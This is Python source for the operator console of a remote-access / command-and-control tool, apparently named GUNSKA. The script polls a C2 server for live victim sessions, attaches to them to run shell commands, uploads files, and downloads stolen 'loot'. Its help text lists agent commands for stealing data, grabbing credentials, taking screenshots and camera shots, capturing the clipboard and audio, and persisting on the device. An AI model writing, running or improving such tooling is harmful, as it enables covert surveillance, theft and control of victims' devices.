#!/usr/bin/env python3
"""GUNSKA console — operator side (stdlib only)."""
import argparse
import json
import os
import re
import sys
import threading
import time
import urllib.request

ap = argparse.ArgumentParser()
ap.add_argument("--url", required=True)
ap.add_argument("--key", required=True)
g = ap.parse_args()

U = g.url.rstrip("/")
H = {"X-Auth": g.key}
cur = None
seq = 0
loot_dir = os.path.expanduser("~/loot")

HELP = """ls | in <id> | loot | dl <fid> | link | q
attached: shell commands, or .leave .info .ls .cd .get .put .steal .grab .shot .cam
          .clip .toast .vibrate .audio .py .persist .unpersist .sd"""


def api(path, data=None, hdr=None, raw=False, timeout=90):
    h = dict(H)
    h.update(hdr or {})
    r = urllib.request.Request(U + path, data=data, headers=h)
    with urllib.request.urlopen(r, timeout=timeout) as f:
        return f.read() if raw else f.read().decode()


def prompt():
    sys.stdout.write("\033[92m[%s]\033[0m> " % cur if cur else "\033[96mc2\033[0m> ")
    sys.stdout.flush()


def pump():
    global seq
    while True:
        if cur:
            sid = cur
            try:
                j = json.loads(api("/api/out?sid=%s&after=%d" % (sid, seq)))
                if sid == cur and j.get("lines"):
                    seq = j["seq"]
                    sys.stdout.write("".join(j["lines"]))
                    sys.stdout.flush()
            except Exception:
                pass
        time.sleep(0.4)


def show_sessions():
    rows = json.loads(api("/api/sessions"))
    if not rows:
        print("(no sessions)")
        return
    for s in rows:
        print("%s %-16s %s@%s %s %s" % ("*" if s["on"] else "-", s["id"],
                                        s["user"] or "?", s["host"] or "?", s["ip"] or "?", s["os"] or ""))


def show_loot():
    rows = json.loads(api("/api/loot"))
    if not rows:
        print("(empty)")
        return
    for f in rows:
        print("%s %10d %s" % (f["id"], f["size"], f["name"]))


def dl(fid):
    os.makedirs(loot_dir, exist_ok=True)
    r = urllib.request.Request(U + "/api/loot/" + fid, headers=H)
    with urllib.request.urlopen(r, timeout=180) as f:
        cd = f.headers.get("Content-Disposition") or ""
        m = re.search(r'filename="?([^";]+)"?', cd)
        name = os.path.basename(m.group(1)) if m else fid + ".bin"
        data = f.read()
    p = os.path.join(loot_dir, name)
    with open(p, "wb") as fh:
        fh.write(data)
    print("saved %s (%d b)" % (p, len(data)))


def main():
    global cur, seq
    os.makedirs(loot_dir, exist_ok=True)
    threading.Thread(target=pump, daemon=True).start()

    while True:
        prompt()
        line = sys.stdin.readline()
        if not line:
            break
        line = line.rstrip("\n")
        if not line.strip():
            continue
        try:
            if not cur:
                c = line.split()
                cmd = c[0].lower()
                if cmd in ("ls", "list"):
                    show_sessions()
                elif cmd == "in" and len(c) > 1:
                    cur, seq = c[1], 0
                    print("attached %s — .leave to detach" % cur)
                elif cmd == "loot":
                    show_loot()
                elif cmd == "dl" and len(c) > 1:
                    dl(c[1])
                elif cmd == "link":
                    print(api("/link"))
                elif cmd in ("help", "?"):
                    print(HELP)
                elif cmd in ("q", "exit", "quit"):
                    break
                else:
                    print(HELP)
                continue

            if line.startswith(".put "):
                path = line[5:].strip()
                with open(path, "rb") as fh:
                    data = fh.read()
                api("/api/put", data, {"X-Sid": cur, "X-Name": os.path.basename(path)})
                print("sent %d bytes" % len(data))
            elif line in (".loot",):
                show_loot()
            elif line.startswith(".dl "):
                dl(line[4:].strip())
            elif line in (".help", "help"):
                print(HELP)
            else:
                api("/api/cmd", json.dumps({"sid": cur, "cmd": line}).encode())
                if line.strip() in (".leave", ".detach"):
                    cur = None
        except KeyboardInterrupt:
            if cur:
                cur = None
            else:
                break
        except Exception as e:
            print("ERR", e)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
